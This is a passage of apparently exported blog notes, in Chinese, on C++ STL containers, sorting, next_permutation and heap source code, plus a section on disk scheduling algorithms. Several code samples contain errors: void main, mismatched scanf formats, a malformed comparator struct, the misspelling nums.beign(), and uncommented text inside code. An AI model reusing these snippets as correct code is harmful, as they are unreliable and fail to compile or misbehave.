<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span>  </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;      </span><br><span class="line">    <span class="type">int</span> x;  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>,&amp;x);      </span><br><span class="line">    multiset&lt;<span class="type">int</span>&gt;h;            </span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;          </span><br><span class="line">        h.<span class="built_in">insert</span>(x);           </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>,&amp;x);      </span><br><span class="line">    &#125;      </span><br><span class="line">    <span class="keyword">while</span>(!h.<span class="built_in">empty</span>())&#123;                 </span><br><span class="line">        __typeof(h.<span class="built_in">begin</span>()) c=h.<span class="built_in">begin</span>();  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ld &quot;</span>,*c);             </span><br><span class="line">        h.<span class="built_in">erase</span>(c);                </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于输入数据：32 61 12 2 12 0,该程序的输出是：2 12 12 32 61。</p>
</blockquote>
<h3 id="2-1-2-放入自定义类型的数据：">2.1.2 放入自定义类型的数据：</h3>
<p>不只是int类型，multiset还可以存储其他的类型诸如 string类型，结构(struct或class)类型。而我们一般在编程当中遇到的问题经常用到自定义的类型，即struct或class。例如下面的例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rec</span>&#123;<span class="type">int</span> x,y;&#125;;  </span><br><span class="line">multiset&lt;rec&gt;h;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span>&#123;  </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> rec&amp;a,<span class="type">const</span> rec&amp;b&#123;  </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">return</span> a.x&lt;b.x||a.x==b.x&amp;&amp;a.y&lt;b.y;    &#125;  </span></span></span><br><span class="line"><span class="params"><span class="function">&#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">					</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">struct</span> rec&#123;<span class="type">int</span> x,y;&#125;;  </span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">struct</span> cmp&#123;<span class="type">bool</span> <span class="keyword">operator</span>()(<span class="type">const</span> rec&amp;a,<span class="type">const</span> rec&amp;b)&#123;<span class="keyword">return</span> a.x&lt;b.x||a.x==b.x&amp;&amp;a.y&lt;b.y;    &#125;&#125;;  </span></span></span><br><span class="line"><span class="params"><span class="function">multiset&lt;rec,cmp&gt;h;</span></span></span><br></pre></td></tr></table></figure>
<p>不过以上的代码是没有任何用处的，因为multiset并不知道如何去比较一个自定义的类型。怎么办呢？我们可以定义multiset里面rec类型变量之间的小于关系的含义（这里以x为第一关键字为例），具体过程如下：</p>
<p>定义一个比较类cmp，cmp内部的operator函数的作用是比较rec类型a和b的大小(以x为第一关键字，y为第二关键字)，告诉了序列h如何去比较里面的元素(重载运算符)</p>
<h1>3 set、unordered_set区别</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unordered_set&lt;pair&lt;int, int&gt;&gt; test;   # error: use of deleted function function</span></span><br><span class="line">set&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; record, gu; <span class="comment">// 记录边</span></span><br></pre></td></tr></table></figure>
<h1>4 vector</h1>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>nums.erase(nums.begin()+index)</td>
<td>删除下标为index处的元素</td>
</tr>
</tbody>
</table>
<h1>5 array</h1>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>array&lt;int, 26&gt; cnt = {};</td>
<td>初始化为0，没有{}则为默认初始化</td>
</tr>
</tbody>
</table>
<h1>6 string</h1>
<blockquote>
<p>cin：遇到空格结束读取<br>
getline(cin, line)：读取一行（包括换行符），line不包括换行符</p>
</blockquote>
<p>to_string<br>
stoi</p>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>功能</th>
<th>头文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>s.push_back(ch)</td>
<td>在后面添加一个字符</td>
<td></td>
</tr>
<tr>
<td>s.append(args)</td>
<td>参数字符串可以是string，也可以是c_str</td>
<td></td>
</tr>
<tr>
<td>s.append(args,cnt)</td>
<td>从args起始位置添加cnt个字符</td>
<td></td>
</tr>
<tr>
<td>s.substr(pos,n)</td>
<td>截取字符串，从pos位置开始截取n个字符</td>
<td></td>
</tr>
<tr>
<td>count(s.begin(), s.end(), ‘A’)</td>
<td>字符计数</td>
<td>algorithm</td>
</tr>
<tr>
<td>reverse(s.begin(),s.end())</td>
<td>字符串翻转</td>
<td>algorithm</td>
</tr>
<tr>
<td>num.find_last_not_of(‘0’)</td>
<td>从后往前第一个不为0的下标</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="6-1-字符相关函数">6.1 字符相关函数</h2>
<blockquote>
<p>#include &lt;ctype.h&gt;</p>
</blockquote>
<table>
<thead>
<tr>
<th>cctype</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303291127460.png" alt="image-20221029205740860"></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>isalnum()</td>
<td>是否为数字或者字符</td>
</tr>
<tr>
<td>tolower( )</td>
<td>将字符变为小写字符</td>
</tr>
</tbody>
</table>
<h2 id="6-2-根据空格分割字符串">6.2 根据空格分割字符串</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string line=<span class="string">&quot;this student is studious&quot;</span>;</span><br><span class="line">stringstream ss;</span><br><span class="line">string w;</span><br><span class="line">ss&lt;&lt;line;</span><br><span class="line"><span class="keyword">while</span>(ss&gt;&gt;w)&#123;</span><br><span class="line">	cout&lt;&lt;w&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>7 priority_queue</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;<span class="type">int</span>&gt; pq;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义排序，小根堆</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Comp</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(ListNode* a,ListNode *b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;val&gt;b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;;</span><br><span class="line">priority_queue&lt;ListNode*,vector&lt;ListNode*&gt;,Comp&gt; pq;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span><span class="params">(pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; m, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m.second &gt; n.second;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(&amp;cmp)&gt; <span class="built_in">q</span>(cmp);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>成员方法</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>pq.push(val)</td>
<td>插入一个元素</td>
</tr>
<tr>
<td>pq.pop()</td>
<td>弹出最值</td>
</tr>
<tr>
<td>pq.top()</td>
<td>返回最值</td>
</tr>
</tbody>
</table>
<h1>8 algorithm</h1>
<h2 id="8-1-sort">8.1 sort</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//自定义排序</span></span><br><span class="line">	vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; nums=&#123;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;, &#123;<span class="number">2</span>, <span class="number">4</span>&#125;, &#123;<span class="number">1</span>, <span class="number">3</span>&#125;&#125;;</span><br><span class="line">	<span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),[](<span class="keyword">auto</span> &amp;a,<span class="keyword">auto</span> &amp;b)&#123;</span><br><span class="line">		<span class="keyword">return</span> a[<span class="number">1</span>]&lt;b[<span class="number">1</span>];</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="comment">//定义排序函数</span></span><br><span class="line">	<span class="built_in">sort</span>(nums.<span class="built_in">beign</span>(),nums.<span class="built_in">end</span>(),compare);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), greater&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;());从大到小排序</span><br><span class="line">	</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">	<span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/WHEgqing/article/details/42455705?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">(6条消息) 浅析C/C++中sort函数的用法_WHEgqing的专栏-CSDN博客</a></p>
<h2 id="8-2-lower-bound">8.2 lower_bound</h2>
<p>查找大于或者等于x的第一个位置</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/22/%E8%AF%AD%E6%B3%95/C++/STL%20%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    <content><![CDATA[<h1>priority_queue(heap)</h1>
<h3 id="push">push</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">template</span>&lt;<span class="keyword">typename</span> _RandomAccessIterator, <span class="keyword">typename</span> _Distance, <span class="keyword">typename</span> _Tp,</span><br><span class="line">   <span class="keyword">typename</span> _Compare&gt;</span><br><span class="line">   <span class="type">void</span></span><br><span class="line">   __push_heap(_RandomAccessIterator __first,</span><br><span class="line">	_Distance __holeIndex, _Distance __topIndex, _Tp __value,</span><br><span class="line">	_Compare&amp; __comp)</span><br><span class="line"><span class="comment">//首迭代器,插入值索引(__last-1),堆顶索引(0),插入值,比较函数</span></span><br><span class="line">   &#123;</span><br><span class="line">     _Distance __parent = (__holeIndex - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">     <span class="comment">//父节点值与节点值比较，默认less，父节点小，则交换</span></span><br><span class="line">     <span class="keyword">while</span> (__holeIndex &gt; __topIndex &amp;&amp; __comp(__first + __parent, __value))</span><br><span class="line">&#123;</span><br><span class="line">  *(__first + __holeIndex) = _GLIBCXX_MOVE(*(__first + __parent));</span><br><span class="line">  __holeIndex = __parent;</span><br><span class="line">  __parent = (__holeIndex - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">     *(__first + __holeIndex) = _GLIBCXX_MOVE(__value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/05/23/%E8%AF%AD%E6%B3%95/C++/Sequential%20Containers/</url>
    <content><![CDATA[<h1>Sequential Containers</h1>
<p>元素在顺序容器中的顺序与其加入容器时的位置相对应。</p>
<h2 id="Container-Operations">Container Operations</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305241635831.png" alt="image-20230524163541746"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator iter1 = vec.<span class="built_in">begin</span>(), iter2 = vec.<span class="built_in">end</span>();</span><br><span class="line">[begin,end)</span><br></pre></td></tr></table></figure>
<p>定义和初始化容器</p>
<table>
<thead>
<tr>
<th>C c</th>
<th>默认初始化</th>
</tr>
</thead>
<tbody>
<tr>
<td>C c1(c2)</td>
<td></td>
</tr>
<tr>
<td>C c1=c2</td>
<td></td>
</tr>
<tr>
<td>C c{a,b,c,…}</td>
<td></td>
</tr>
<tr>
<td>C c={a,b,c,…}</td>
<td></td>
</tr>
<tr>
<td>C c(b,e)</td>
<td>迭代器初始化，[b,e)</td>
</tr>
<tr>
<td>C seq(n)</td>
<td></td>
</tr>
<tr>
<td>C seq(n,t)</td>
<td>n个元素，值为t</td>
</tr>
</tbody>
</table>
<h2 id="Container-Adaptors">Container Adaptors</h2>
<blockquote>
<p>容器适配器</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305231755730.png" alt="image-20230523175546695"></p>
<h3 id="stack">stack</h3>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202305231753373.png" alt="image-20230523175309310"></p>
<h3 id="queue">queue</h3>
<h3 id="priority-queue">priority_queue</h3>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">Container</span> = vector&lt;T&gt;,  <span class="keyword">class</span> Compare = less&lt;<span class="keyword">typename</span> Container::value_type&gt; &gt; <span class="keyword">class</span> priority_queue;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Compare:</p>
<p>comp(a,b)，如果a应该出现在b前面，返回true，弹出的元素是根据<em>strict weak ordering</em>的最后一个元素</p>
<p>A binary predicate that takes two elements (of type T) as arguments and returns a <code>bool</code>.<br>
The expression <code>comp(a,b)</code>, where comp is an object of this type and a and b are elements in the container, shall return <code>true</code> if a is considered to go before b in the <em>strict weak ordering</em> the function defines.<br>
The priority_queue uses this function to maintain the elements sorted in a way that preserves <em>heap properties</em> (i.e., that the element popped is the last according to this <em>strict weak ordering</em>).<br>
This can be a function pointer or a function object, and defaults to <code>less&lt;T&gt;</code>, which returns the same as applying the <em>less-than operator</em> (<code>a&lt;b</code>).</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/05/16/%E8%AF%AD%E6%B3%95/C++/c++%20set/</url>
    <content><![CDATA[<h1>set</h1>
<h2 id="multiset">multiset</h2>
<p><a href="https://blog.csdn.net/sodacoco/article/details/84798621">(41条消息) multiset用法总结_二喵君的博客-CSDN博客</a></p>
<h2 id="常用函数总结：">常用函数总结：</h2>
<p><strong>构造、拷贝、析构</strong></p>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p><em>set</em>&nbsp;c</p></td><td><p>产生一个空的set/multiset，不含任何元素</p></td></tr><tr><td><p>set c(op)</p></td><td><p>以op为排序准则，产生一个空的set/multiset</p></td></tr><tr><td><p>set c1(c2)</p></td><td><p>产生某个set/multiset的副本，所有元素都被拷贝</p></td></tr><tr><td><p>set c(beg,end)</p></td><td><p>以区间[beg,end)内的所有元素产生一个set/multiset</p></td></tr><tr><td><p>set c(beg,end, op)</p></td><td><p>以op为排序准则，区间[beg,end)内的元素产生一个set/multiset</p></td></tr><tr><td><p>c.~set()</p></td><td><p>销毁所有元素，释放内存</p></td></tr><tr><td><p>set&lt;Elem&gt;</p></td><td><p>产生一个set，以(operator &lt;)为排序准则</p></td></tr><tr><td><p>set&lt;Elem,0p&gt;</p></td><td><p>产生一个set，以op为排序准则</p></td></tr></tbody></table>
<h3 id="非变动性操作"><strong>非变动性操作</strong></h3>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.size()</p></td><td><p>返回当前的元素数量</p></td></tr><tr><td><p>c.empty ()</p></td><td><p>判断大小是否为零，等同于0 == size()，效率更高</p></td></tr><tr><td><p>c.max_size()</p></td><td><p>返回能容纳的元素最大数量</p></td></tr><tr><td><p>c1 == c2</p></td><td><p>判断c1是否等于c2</p></td></tr><tr><td><p>c1 != c2</p></td><td><p>判断c1是否不等于c2(等同于!(c1==c2))</p></td></tr><tr><td><p>c1 &lt; c2</p></td><td><p>判断c1是否小于c2</p></td></tr><tr><td><p>c1 &gt; c2</p></td><td><p>判断c1是否大于c2</p></td></tr><tr><td><p>c1 &lt;= c2</p></td><td><p>判断c1是否小于等于c2(等同于!(c2&lt;c1))</p></td></tr><tr><td><p>c1 &gt;= c2</p></td><td><p>判断c1是否大于等于c2 (等同于!(c1&lt;c2))</p></td></tr></tbody></table>
<h3 id="特殊的搜寻函数"><strong>特殊的搜寻函数</strong></h3>
<p>sets和multisets在元素快速搜寻方面做了优化设计，提供了特殊的搜寻函数，所以应优先使用这些搜寻函数，可获得对数复杂度，而非STL的线性复杂度。比如在1000个元素搜寻，对数复杂度平均十次，而线性复杂度平均需要500次。</p>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>count (elem)</p></td><td><p>返回元素值为elem的个数</p></td></tr><tr><td><p>find(elem)</p></td><td><p>返回元素值为elem的第一个元素，如果没有返回end()</p></td></tr><tr><td><p>lower _bound(elem)</p></td><td><p>返回元素值为elem的第一个可安插位置，也就是元素值 &gt;= elem的第一个元素位置</p></td></tr><tr><td><p>upper _bound (elem)</p></td><td><p>返回元素值为elem的最后一个可安插位置，也就是元素值 &gt; elem 的第一个元素位置</p></td></tr><tr><td><p>equal_range (elem)</p></td><td><p>返回elem可安插的第一个位置和最后一个位置，也就是元素值==elem的区间</p></td></tr></tbody></table>
<h3 id="赋值"><strong>赋值</strong></h3>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c1 = c2</p></td><td><p>将c2的元素全部给c1</p></td></tr><tr><td><p>c1.swap(c2)</p></td><td><p>将c1和c2 的元素互换</p></td></tr><tr><td><p>swap(c1,c2)</p></td><td><p>同上，全局函数</p></td></tr></tbody></table>
<h3 id="迭代器相关函数"><strong>迭代器相关函数</strong></h3>
<p>sets和multisets的迭代器是双向迭代器，对迭代器操作而言，所有的元素都被视为常数，可以确保你不会人为改变元素值，从而打乱既定顺序，所以无法调用变动性算法，如remove()。</p>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.begin()</p></td><td><p>返回一个随机存取迭代器，指向第一个元素</p></td></tr><tr><td><p>c.end()</p></td><td><p>返回一个随机存取迭代器，指向最后一个元素的下一个位置</p></td></tr><tr><td><p>c.rbegin()</p></td><td><p>返回一个逆向迭代器，指向逆向迭代的第一个元素</p></td></tr><tr><td><p>c.rend()</p></td><td><p>返回一个逆向迭代器，指向逆向迭代的最后一个元素的下一个位置</p></td></tr></tbody></table>
<h3 id="安插和删除元素">安插和删除元素</h3>
<p>必须保证参数有效,迭代器必须指向有效位置，序列起点不能位于终点之后，不能从空容器删除元素。</p>
<table><tbody><tr><td><p><strong>操作</strong></p></td><td><p><strong>效果</strong></p></td></tr><tr><td><p>c.insert(elem)</p></td><td><p>插入一个elem副本，返回新元素位置，无论插入成功与否。</p></td></tr><tr><td><p>c.insert(pos, elem)</p></td><td><p>安插一个elem元素副本，返回新元素位置，pos为收索起点，提升插入速度。</p></td></tr><tr><td><p>c.insert(beg,end)</p></td><td><p>将区间[beg,end)所有的元素安插到c，无返回值。</p></td></tr><tr><td><p>c.erase(elem)</p></td><td><p>删除与elem相等的所有元素，返回被移除的元素个数。</p></td></tr><tr><td><p>c.erase(pos)</p></td><td><p>移除迭代器pos所指位置元素，无返回值。</p></td></tr><tr><td><p>c.erase(beg,end)</p></td><td><p>移除区间[beg,end)所有元素，无返回值。</p></td></tr><tr><td><p>c.clear()</p></td><td><p>移除所有元素，将容器清空</p></td></tr></tbody></table>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/18/%E8%AF%AD%E6%B3%95/C++/algorithm.h/</url>
    <content><![CDATA[<h2 id="next-permutation">next_permutation</h2>
<blockquote>
<p>next_permutation()是按字典序依次排列的，当排列到最大的值是就会返回false.<br>
生成给定序列的下一个排列，按字典序生成下一个排列。如果有下一个排列，返回true，否则返回false</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> _BidirectionalIterator, <span class="keyword">typename</span> _Compare&gt;</span><br><span class="line"><span class="type">bool</span> __next_permutation(_BidirectionalIterator __first,</span><br><span class="line">                        _BidirectionalIterator __last, _Compare __comp) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__first == __last)  <span class="comment">//区间为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    _BidirectionalIterator __i = __first;</span><br><span class="line">    ++__i;</span><br><span class="line">    <span class="keyword">if</span> (__i == __last)  <span class="comment">//区间只有一个元素</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    __i = __last;</span><br><span class="line">    --__i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        _BidirectionalIterator __ii = __i;  <span class="comment">//__i指向__ii前一个位置</span></span><br><span class="line">        --__i;</span><br><span class="line">        <span class="keyword">if</span> (__comp(__i, __ii)) &#123;    <span class="comment">// *__i&lt;*__ii</span></span><br><span class="line">            _BidirectionalIterator __j = __last;</span><br><span class="line">            <span class="keyword">while</span> (!__comp(__i, --__j)) &#123;   <span class="comment">//找到从后面起第一个*__j&gt;*__i</span></span><br><span class="line">            &#125;</span><br><span class="line">            std::<span class="built_in">iter_swap</span>(__i, __j);</span><br><span class="line">            std::__reverse(__ii, __last, std::__iterator_category(__first));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//区间已经完全逆序</span></span><br><span class="line">        <span class="keyword">if</span> (__i == __first) &#123;</span><br><span class="line">            std::__reverse(__first, __last, std::__iterator_category(__first));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/qq_46527915/article/details/115276567">使用next_permutation()的坑，你中招了么?_辉小歌的博客-CSDN博客</a><br>
<a href="https://zhuanlan.zhihu.com/p/616792845">C++神奇的next_permutation - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>常量指针与指针常量</title>
    <url>/2023/02/28/%E8%AF%AD%E6%B3%95/C++/%E5%B8%B8%E9%87%8F%E6%8C%87%E9%92%88%E4%B8%8E%E6%8C%87%E9%92%88%E5%B8%B8%E9%87%8F/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (c)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;afa&quot;</span>);</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> *p2 = &amp;x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p2);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">//*p2 = 3; //常量指针，指向常量的指针，*p2是一个常量，不能修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p2);</span><br><span class="line">    <span class="type">int</span> *<span class="type">const</span> p3 = &amp;x;</span><br><span class="line">    <span class="comment">// p3 = &amp;y;  //指针常量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/image-20210406115550244.png" alt="image-20210406115550244"></p>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/05/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(3)%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1>磁盘调度算法</h1>
<p>磁盘调度算法是操作系统中对磁盘访问请求进行排序和调度的算法，其目的是提高磁盘的访问效率。</p>
<p>一次磁盘读写操作的时间由磁盘寻道/寻找时间、延迟时间和传输时间决定。磁盘调度算法可以通过改变到达磁盘请求的处理顺序，减少磁盘寻道时间和延迟时间。</p>
<ol>
<li class="lvl-3">
<p><strong>先来先服务算法（First-Come First-Served，FCFS）</strong>：按照请求到达磁盘调度器的顺序进行处理，先到达的请求的先被服务。FCFS 算法实现起来比较简单，不存在算法开销。不过，由于没有考虑磁头移动的路径和方向，平均寻道时间较长。同时，该算法容易出现饥饿问题，即一些后到的磁盘请求可能需要等待很长时间才能得到服务。</p>
</li>
<li class="lvl-3">
<p><strong>最短寻道时间优先算法（Shortest Seek Time First，SSTF）</strong>：也被称为最佳服务优先（Shortest Service Time First，SSTF）算法，优先选择距离当前磁头位置最近的请求进行服务。SSTF 算法能够最小化磁头的寻道时间，但容易出现饥饿问题，即磁头附近的请求不断被服务，远离磁头的请求长时间得不到响应。实际应用中，需要优化一下该算法的实现，避免出现饥饿问题。</p>
</li>
<li class="lvl-3">
<p><strong>扫描算法（SCAN）</strong>：也被称为电梯（Elevator）算法，基本思想和电梯非常类似。磁头沿着一个方向扫描磁盘，如果经过的磁道有请求就处理，直到到达磁盘的边界，然后改变移动方向，依此往复。SCAN 算法能够保证所有的请求得到服务，解决了饥饿问题。但是，如果磁头从一个方向刚扫描完，请求才到的话。这个请求就需要等到磁头从相反方向过来之后才能得到处理。</p>
</li>
<li class="lvl-3">
<p><strong>循环扫描算法（Circular Scan，C-SCAN）</strong>：SCAN 算法的变体，只在磁盘的一侧进行扫描，并且只按照一个方向扫描，直到到达磁盘边界，然后回到磁盘起点，重新开始循环。</p>
</li>
<li class="lvl-3">
<p><strong>边扫描边观察算法（LOOK）</strong>：SCAN 算法中磁头到了磁盘的边界才改变移动方向，这样可能会做很多无用功，因为磁头移动方向上可能已经没有请求需要处理了。LOOK 算法对 SCAN 算法进行了改进，如果磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向，依此往复。也就是边扫描边观察指定方向上还有无请求，因此叫 LOOK。</p>
</li>
<li class="lvl-3">
<p><strong>均衡循环扫描算法（C-LOOK）</strong>：C-SCAN 只有到达磁盘边界时才能改变磁头移动方向，并且磁头返回时也需要返回到磁盘起点，这样可能会做很多无用功。C-LOOK 算法对 C-SCAN 算法进行了改进，如果磁头移动的方向上已经没有磁道访问请求了，就可以立即让磁头返回，并且磁头只需要返回到有磁道访问请求的位置即可。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2023/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(1)%EF%BC%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1>1 进程和线程</h1>
<blockquote>
